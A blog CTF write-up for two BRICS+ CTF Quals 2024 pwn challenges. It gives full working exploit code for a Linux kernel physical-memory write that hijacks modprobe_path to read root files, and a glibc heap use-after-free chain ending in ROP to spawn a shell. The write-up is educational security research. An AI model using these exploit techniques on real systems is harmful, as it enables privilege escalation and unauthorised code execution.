---
layout: post
title: "BRICS+ CTF Quals 2024 - Pwnable Write up"
date: 2024-10-07 06:00:00 +0900
categories: [Security, CTF]
tags: [CTF, linux, OOB, tcache, kernel, UAF]
media_subpath: /assets/img/20241007_brics-quals-write-up
image: logo.png
---

I solved 2 pwn chals out of 3 during and after BRICS+ CTF Quals 2024. 

- [https://ctftime.org/event/2389/](https://ctftime.org/event/2389/)

## **1. physler (17 solves)**

**[0x01] Summary**

- Linux Kernel Exploit with Arbitrary Physical Address Write
- Linux kernel binary is loaded at static physical address by a bootloader.

**[0x02] Solution**

Authors kindly gives the sources of kernel module. The core of it is like this.

```c
static noinline long ioctlHandler(struct file *file, unsigned int cmd, unsigned long arg)
{
    struct ioctl_map _map;
    struct ioctl_write _write;

    switch (cmd) {
        case IOCTL_MAP_PHYS_ADDR: {

            if (copy_from_user(&_map, (void*)arg, sizeof(_map))) {
                return -EFAULT;
            }

            if (mem)
                iounmap(mem);

            mem = ioremap(_map.phys_addr, _map.size);

            if (!mem) {
                return -EFAULT;
            }
            break;
        }
        case IOCTL_WRITE_PHYS_MEM: {
            if (!mem)
                return -EFAULT;

            if (copy_from_user(&_write, (void*)arg, sizeof(_write))) {
                return -EFAULT;
            }

            size = _write.size;

            if (size > sizeof(kernel_buffer))
                size = sizeof(kernel_buffer);

            if (copy_from_user(kernel_buffer, (char *)_write.in_data, size))
                return -EFAULT;

            memcpy_toio(mem, kernel_buffer, size);
            break;
        }
        default:
            return -EINVAL;
    }

    return 0;
}
```

With this kernel module, we can access any arbitrary physical address and overwrite it. `ioremap` is used for accessing memory mapped I/O regions of hardware devices in kernel mode. This function maps physical address of the memory buffer into the virtual address of kernel.

While searching physical addresses in linux, I found that the linux kernel is loaded by a bootloader into predefined physical memory address. And this address is commonly set to `0x1000000` by default.

```py
# first boot
gef> kbase
[+] Wait for memory scan
kernel text:   0xffffffffbc000000-0xffffffffbd400000 (0x1400000 bytes)
kernel rodata: 0xffffffffbd400000-0xffffffffbdb5f000 (0x75f000 bytes)
kernel data:   0xffffffffbdc00000-0xffffffffbe054000 (0x454000 bytes)
gef> v2p 0xffffffffbc000000
Virt: 0xffffffffbc000000 -> Phys: 0x1000000
gef> v2p 0xffffffffbd400000
Virt: 0xffffffffbd400000 -> Phys: 0x2400000
gef> v2p 0xffffffffbdc00000
Virt: 0xffffffffbdc00000 -> Phys: 0x2c00000

# second boot
gef> kbase
[+] Wait for memory scan
kernel text:   0xffffffff9c800000-0xffffffff9dc00000 (0x1400000 bytes)
kernel rodata: 0xffffffff9dc00000-0xffffffff9e35f000 (0x75f000 bytes)
kernel data:   0xffffffff9e400000-0xffffffff9e854000 (0x454000 bytes)
gef> v2p 0xffffffff9c800000
Virt: 0xffffffff9c800000 -> Phys: 0x1000000
gef> v2p 0xffffffff9dc00000
Virt: 0xffffffff9dc00000 -> Phys: 0x2400000
gef> v2p 0xffffffff9e400000
Virt: 0xffffffff9e400000 -> Phys: 0x2c00000
```

The virtual base address of kernel base is different at every booting, but the physical base address of it is not. Because KASLR (Kernel-ASLR) is designed to randomize the virtual base address, not physical base address.

With this, we can overwrite any part of the kernel code and data. I thought that `modprobe_path` exploit technique is most simple and tried it. On the other hand, I was also worried because I heard that the technique has been blocked since certain Linux version. But there's a way to find out whether it works or not. ([https://github.com/smallkirby/kernelpwn/blob/master/important_config/STATIC_USERMODEHELPER.md](https://github.com/smallkirby/kernelpwn/blob/master/important_config/STATIC_USERMODEHELPER.md))

If `call_usermodehelper_setup` function saves original value of `$rdi`, it works. Otherwise, it is not. Luckily, the linux from this chal saves the register.

```py
gef> ksymaddr-remote call_usermodehelper_setup
[+] Wait for memory scan
0xffffffff9c90fe70 T __pfx_call_usermodehelper_setup
0xffffffff9c90fe80 T call_usermodehelper_setup
0xffffffff9e2e8f5c r __ksymtab_call_usermodehelper_setup
gef> x/40i 0xffffffff9c90fe80
   0xffffffff9c90fe80:	endbr64 
   0xffffffff9c90fe84:	nop    DWORD PTR [rax+rax*1+0x0]
   0xffffffff9c90fe89:	push   rbp
   0xffffffff9c90fe8a:	mov    eax,ecx
   0xffffffff9c90fe8c:	mov    rbp,rsp
   0xffffffff9c90fe8f:	push   r15
   0xffffffff9c90fe91:	mov    r15,rdi          # <--- it saves rdi
   0xffffffff9c90fe94:	push   r14
   0xffffffff9c90fe96:	mov    r14,rsi
   0xffffffff9c90fe99:	push   r13
   0xffffffff9c90fe9b:	mov    r13,rdx
   0xffffffff9c90fe9e:	push   r12
   0xffffffff9c90fea0:	mov    r12,r9
   0xffffffff9c90fea3:	push   rbx
   0xffffffff9c90fea4:	mov    rbx,r8
   0xffffffff9c90fea7:	mov    r8d,ecx
   0xffffffff9c90feaa:	or     r8d,0x100
   0xffffffff9c90feb1:	sub    rsp,0x10
   0xffffffff9c90feb5:	and    eax,0x400011
   0xffffffff9c90feba:	jne    0xffffffff9c90ff43
   0xffffffff9c90fec0:	mov    edx,eax
   0xffffffff9c90fec2:	cmp    eax,0x3
   0xffffffff9c90fec5:	ja     0xffffffff9c90ff64
   0xffffffff9c90fecb:	lea    rax,[rdx*8+0x0]
   0xffffffff9c90fed3:	mov    esi,r8d
   0xffffffff9c90fed6:	sub    rax,rdx
   0xffffffff9c90fed9:	mov    edx,0x60
   0xffffffff9c90fede:	shl    rax,0x4
   0xffffffff9c90fee2:	mov    rdi,QWORD PTR [rax-0x61d5c2f8]
   0xffffffff9c90fee9:	call   0xffffffff9cc1c700
   0xffffffff9c90feee:	test   rax,rax
   0xffffffff9c90fef1:	je     0xffffffff9c90ff30
   0xffffffff9c90fef3:	lea    rdx,[rax+0x8]
   0xffffffff9c90fef7:	mov    QWORD PTR [rax+0x18],0xffffffff9c910490
   0xffffffff9c90feff:	movabs rsi,0xfffffffe00000
   0xffffffff9c90ff09:	mov    QWORD PTR [rax+0x8],rdx
   0xffffffff9c90ff0d:	mov    QWORD PTR [rax+0x10],rdx
   0xffffffff9c90ff11:	mov    rdx,QWORD PTR [rbp+0x10]
   0xffffffff9c90ff15:	mov    QWORD PTR [rax],rsi
   0xffffffff9c90ff18:	mov    QWORD PTR [rax+0x28],r15     # <--- and use it
```

So, the exploit code is as follows:

```c
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#define IOCTL_MAP_PHYS_ADDR 0x1001
#define IOCTL_READ_PHYS_MEM 0x2002
#define IOCTL_WRITE_PHYS_MEM 0x3003

struct ioctl_map {
    unsigned long phys_addr;
    unsigned long size;
};

struct ioctl_write {
    unsigned long size;
    unsigned char* in_data;
};

void get_flag(void){
    puts("[*] Returned to userland, setting up for fake modprobe");

    system("echo '#!/bin/sh\ncp /root/flag.txt /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    puts("[*] Run unknown file");
    system("/tmp/dummy");

    puts("[*] Hopefully flag is readable");
    system("cat /tmp/flag");

    exit(0);
}

int main () {
    int fd = open("/dev/physler", O_RDWR);
    printf("%d\n", fd);

    struct ioctl_map _map = {
        .phys_addr = 0x2dd5820, // modprobe_path
        .size = 0x1000
    };

    printf("%d\n", ioctl(fd, IOCTL_MAP_PHYS_ADDR, &_map));

    char *ptr = "/tmp/x";
    struct ioctl_write _write = {
        .size = strlen(ptr) + 1,
        .in_data = ptr
    };

    ioctl(fd, IOCTL_WRITE_PHYS_MEM, &_write);
    get_flag();

    return 0;
}
```

`brics+{6163373a-5a31-4b67-81d1-6400c401d854}`

**[0x03] References**

- [https://stackoverflow.com/questions/33578993/base-address-at-which-the-linux-kernel-is-loaded](https://stackoverflow.com/questions/33578993/base-address-at-which-the-linux-kernel-is-loaded)
- [https://docs.kernel.org/driver-api/device-io.html](https://docs.kernel.org/driver-api/device-io.html)
- [https://github.com/smallkirby/kernelpwn/blob/master/technique/modprobe_path.md](https://github.com/smallkirby/kernelpwn/blob/master/technique/modprobe_path.md)
- [https://github.com/smallkirby/kernelpwn/blob/master/important_config/STATIC_USERMODEHELPER.md](https://github.com/smallkirby/kernelpwn/blob/master/important_config/STATIC_USERMODEHELPER.md)



## **2. chains (17 solves)**

**[0x01] Summary**

- Dangling pointers are created and we can leak by overlapping two objects (`Proxy`, `Chain`).
- By using `malloc_consolidate`, make unsorted bins from free'd `Proxy` chunks and modify the members of it to get AAR.
- overwrite `tcache_perthread_struct` and get shell through ROP.

**[0x02] Solution**

When we free a chunk, glibc deal with it through `__libc_free`. So if you look at it in detail, you can find this code.

```c
#define FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)

/* If freeing a large space, consolidate possibly-surrounding
   chunks.  Then, if the total unused topmost memory exceeds trim
   threshold, ask malloc_trim to reduce top.  */
static void
_int_free_maybe_consolidate (mstate av, INTERNAL_SIZE_T size)
{
  /* Unless max_fast is 0, we don't know if there are fastbins
     bordering top, so we cannot tell for sure whether threshold has
     been reached unless fastbins are consolidated.  But we don't want
     to consolidate on each free.  As a compromise, consolidation is
     performed if FASTBIN_CONSOLIDATION_THRESHOLD is reached.  */
  if (size >= FASTBIN_CONSOLIDATION_THRESHOLD)
    {
      if (atomic_load_relaxed (&av->have_fastchunks))
	malloc_consolidate(av);

      if (av == &main_arena)
	{
#ifndef MORECORE_CANNOT_TRIM
	  if (chunksize (av->top) >= mp_.trim_threshold)
	    systrim (mp_.top_pad, av);
#endif
	}
      else
	{
	  /* Always try heap_trim, even if the top chunk is not large,
	     because the corresponding heap might go away.  */
	  heap_info *heap = heap_for_ptr (top (av));

	  assert (heap->ar_ptr == av);
	  heap_trim (heap, mp_.top_pad);
	}
    }
}
```

When the size of consolidated chunk is larger than `FASTBIN_CONSOLIDATION_THRESHOLD`, `malloc_consolidate` function is called and it turns all fastbin into unsorted bin. By using it, we can overlap and corrupt `Proxy` object and modify its member to get glibc and stack base. Fortunately, we can allocate 0x90 size chunk and if this chunk fills up the tcache (0x7 chunks), then free'd chunks goes unsorted bin. And it can be consolidated.

If you make unsorted bin chunk right before top chunk, it consolidates two chunks into one chunk. Then the size of the merged chunk will easily be larger than `0x10000`. This was core idea of this chal, the rest can be solved similarly to other chals.

I have annotated the exploit code just in case, so please refer to it.

```py
from pwn import *
choice = lambda x: p.sendlineafter(b"> ", str(x).encode())
def addProxy(name, port):
    choice(1)
    p.sendlineafter(b": ", name)
    p.sendlineafter(b": ", str(port).encode())
def deleteProxy(pid):
    choice(2)
    p.sendlineafter(b": ", str(pid).encode())
def addChain(pids):
    choice(3)
    p.sendlineafter(b": ", str(len(pids)).encode())
    for pid in pids:
        p.sendlineafter(b": ", str(pid).encode())
def viewChain(cid):
    choice(4)
    p.sendlineafter(b": ", str(cid).encode())
def deleteChain(cid):
    choice(5)
    p.sendlineafter(b": ", str(cid).encode())
def obfuscate(p, addr):
    return p ^ (addr>>12)
context.binary = ELF("./chains", False)
# libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", False)
# p = process(aslr=1)

libc = ELF("./libc.so.6", False)
p = remote('localhost', 17173)

# 1. allocate many chunks
for _ in range(10):
    addProxy(b'A', 0x41)

# 2. make them free and consolidate each other (fastbin -> unsorted bin)
addChain([x for x in range(10)])
addProxy(b'B', 0x42)
deleteChain(0)
deleteProxy(10)

# 3. leak heap base through self-indicating Chain
addChain([3])
viewChain(0)
p.recvuntil(b"is ")
heap = u64(p.recvuntil(b":", True).ljust(8, b'\x00')) - 0x4b0
log.success(f"heap base @ {hex(heap)}")

# 4. clean heap with Proxy and Chain with invalid index 
for _ in range(7):
    addProxy(b'dummy', 0xFF)

for _ in range(9):
    addChain([-1])

# 5. overwrite Proxy->hostname with unsorted bin left on heap and leak libc base
addProxy(p64(heap + 0x790), 0x41)
addChain([7])
viewChain(1)
p.recvuntil(b"is ")
libc.address = u64(p.recvuntil(b":", True).ljust(8, b'\x00')) - libc.sym._IO_2_1_stdin_ - 0x240
log.success(f"libc base @ {hex(libc.address)}")

# 6. make chunk overlapping and allocate 0x90 chunk into tcache_perthread_struct
addChain([-1])
payload = b'A'*0x38 + p64(0x91) + b'A'*0x28 + p64(0x91) + p64(heap + 0x8a0)
addProxy(payload, 0x41)

deleteProxy(9)
deleteProxy(18)

addProxy(b'A'*0x68 + p64(0x91) + p64(obfuscate(heap + 0x90 + 0x10, heap + 0x8d0)), 0)
addProxy(b'A'*0x18 + p64(0x21) + p64(heap + 0xb0), 0)
addProxy(p64(0) + p64(0x91) + b'A'*0x20, 0)
deleteProxy(17)
deleteProxy(18)

# 7. leak stack with same way  
addProxy(b'A'*0x18 + p64(heap + 0x770), 0)
addProxy(p64(libc.sym.environ), 0)
viewChain(1)
p.recvuntil(b"is ")
stack = u64(p.recvuntil(b":", True).ljust(8, b'\x00')) - 0x148
log.success(f"stack @ {hex(stack)}")

# 8. ROP and get shell 
deleteProxy(18)
deleteProxy(17)

addProxy(b'A'*0x18 + p64(stack), 0)

rop = ROP(libc)
rop.call(rop.find_gadget(["ret"]))
rop.call("system", [next(libc.search(b"/bin/sh"))])
addProxy(b'A'*8 + rop.chain(), 0)

p.interactive()
```
